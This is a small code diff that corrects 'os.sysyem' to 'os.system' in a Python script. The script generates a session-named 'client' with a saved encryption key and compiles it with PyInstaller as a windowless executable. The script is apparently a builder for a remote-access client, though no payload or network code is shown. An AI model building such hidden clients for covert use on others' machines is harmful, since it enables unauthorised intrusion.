@@ -72,6 +72,6 @@ if custom_download == '1':
 open(f'{session}.py', 'w').write(code)
 buildexe = ask(['y', 'n'], 'Do it now?(y/n)', f'Created new client: {session}!\nSaved encryption key to {session} and client code to {session}.py\n You can use PyInstaller to build a binary file.')
 if buildexe == 'y':
-    os.sysyem('pyinstaller --onefile --noconsole ' + session + '.py')
+    os.system('pyinstaller --onefile --noconsole ' + session + '.py')
     print('Executable built successfully and saved in ./dist.')
     input('Press Enter to continue...')
